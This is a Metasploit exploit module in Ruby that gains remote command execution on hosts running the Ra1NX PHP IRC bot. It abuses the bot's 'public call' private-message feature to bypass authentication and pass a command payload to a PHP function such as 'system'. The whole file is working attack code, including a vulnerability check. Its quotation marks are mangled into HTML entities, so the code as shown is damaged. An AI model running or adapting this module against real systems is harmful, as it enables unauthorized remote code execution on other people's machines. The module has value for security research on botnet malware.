# Date: March 24, 2013
# Exploit Author: bwall
# Software Link: https://defense.ballastsecurity.net/decoding/index.php?hash=69401ac90262f3855c23cd143d7d2ae0
# Version: v2.0
# Tested on: Ubuntu
 
require &#039;msf/core&#039;
 
class Metasploit3 < Msf::Exploit::Remote
 
    include Msf::Exploit::Remote::Tcp
 
    def initialize(info = {})
        super(update_info(info,
            &#039;Name&#039;           => &#039;"Ra1NX" PHP Bot pubcall Authentication Bypass Remote Code Execution&#039;,
            &#039;Description&#039;    => %q{
                    This module allows remote command execution on the PHP IRC bot Ra1NX by
                    using the public call feature in private message to covertly bypass the
                    authentication system.
                },
            &#039;Author&#039;         =>
                [
                    &#039;bwall <bwall[at]openbwall.com>&#039; # Ra1NX analysis and Metasploit module
                ],
            &#039;License&#039;        => MSF_LICENSE,
            &#039;References&#039;     =>
                [
                    [&#039;URL&#039;, &#039;https://defense.ballastsecurity.net/wiki/index.php/Ra1NX_bot&#039;],
                    [&#039;URL&#039;, &#039;https://defense.ballastsecurity.net/decoding/index.php?hash=69401ac90262f3855c23cd143d7d2ae0&#039;],
                    [&#039;URL&#039;, &#039;http://ddecode.com/phpdecoder/?results=8c6ba611ea2a504da928c6e176a6537b&#039;]
                ],
            &#039;Platform&#039;       => [ &#039;unix&#039;, &#039;win&#039;],
            &#039;Arch&#039;           => ARCH_CMD,
            &#039;Payload&#039;        =>
                {
                    &#039;Space&#039;    => 344,
                    &#039;BadChars&#039; => &#039;&#039;,
                    &#039;DisableNops&#039; => true,
                    &#039;Compat&#039;      =>
                        {
                            &#039;PayloadType&#039; => &#039;cmd&#039;,
                        }
                },
            &#039;Targets&#039;  =>
                [
                    [ &#039;Ra1NX&#039;, { } ]
                ],
            &#039;Privileged&#039;     => false,
            &#039;DisclosureDate&#039; => &#039;March 24 2013&#039;,
            &#039;DefaultTarget&#039;  => 0))
 
        register_options(
            [
                Opt::RPORT(6667),
                OptString.new(&#039;IRC_PASSWORD&#039;, [false, &#039;IRC Connection Password&#039;, &#039;&#039;]),
                OptString.new(&#039;NICK&#039;, [true, &#039;IRC Nickname&#039;, &#039;msf_user&#039;]),
                OptString.new(&#039;RNICK&#039;, [true, &#039;Nickname of Target IRC Bot&#039;, &#039;jhl1&#039;]),
                OptString.new(&#039;PHP_EXEC&#039;, [true, &#039;Function used to call payload&#039;, &#039;system&#039;])
            ], self.class)
    end
 
    def check
        connect
 
        response = register(sock)
        if response =~ /463/ or response =~ /464/
            print_error("#{rhost}:#{rport} - Connection to the IRC Server not allowed")
            return Exploit::CheckCode::Unknown
        end
        confirm_string = rand_text_alpha(8)
        response = send_msg(sock, "PRIVMSG #{datastore[&#039;RNICK&#039;]} :#{datastore[&#039;RNICK&#039;]} @msg #{datastore[&#039;NICK&#039;]} #{confirm_string}\r\n")
        print response
        quit(sock)
        disconnect
 
        if response =~ /#{confirm_string}/
            return Exploit::CheckCode::Vulnerable
        else
            return Exploit::CheckCode::Safe
        end
    end
 
    def send_msg(sock, data)
        sock.put(data)
        data = ""
        begin
            read_data = sock.get_once(-1, 1)
            while not read_data.nil?
                data << read_data
                read_data = sock.get_once(-1, 1)
            end
        rescue EOFError
        end
        data
    end
 
    def register(sock)
        msg = ""
 
        if datastore[&#039;IRC_PASSWORD&#039;] and not datastore[&#039;IRC_PASSWORD&#039;].empty?
            msg << "PASS #{datastore[&#039;IRC_PASSWORD&#039;]}\r\n"
        end
 
        if datastore[&#039;NICK&#039;].length > 9
            nick = rand_text_alpha(9)
            print_error("The nick is longer than 9 characters, using #{nick}")
        else
            nick = datastore[&#039;NICK&#039;]
        end
 
        msg << "NICK #{nick}\r\n"
        msg << "USER #{nick} #{Rex::Socket.source_address(rhost)} #{rhost} :#{nick}\r\n"
 
        response = send_msg(sock,msg)
        return response
    end
 
    def ra1nx_command(sock)
        encoded = payload.encoded
        command_msg = "PRIVMSG #{datastore[&#039;RNICK&#039;]} :#{datastore[&#039;RNICK&#039;]} @#{datastore[&#039;PHP_EXEC&#039;]} #{encoded}\r\n"
        response = send_msg(sock, command_msg)
        return response
    end
 
    def quit(sock)
        quit_msg = "QUIT :bye bye\r\n"
        sock.put(quit_msg)
    end
 
    def exploit
        connect
 
        print_status("#{rhost}:#{rport} - Registering with the IRC Server...")
        response = register(sock)
        if response =~ /463/ or response =~ /464/
            print_error("#{rhost}:#{rport} - Connection to the IRC Server not allowed")
            return
        end
 
        print_status("#{rhost}:#{rport} - Exploiting the Ra1NX bot...")
        ra1nx_command(sock)
 
        quit(sock)
        disconnect
    end
end

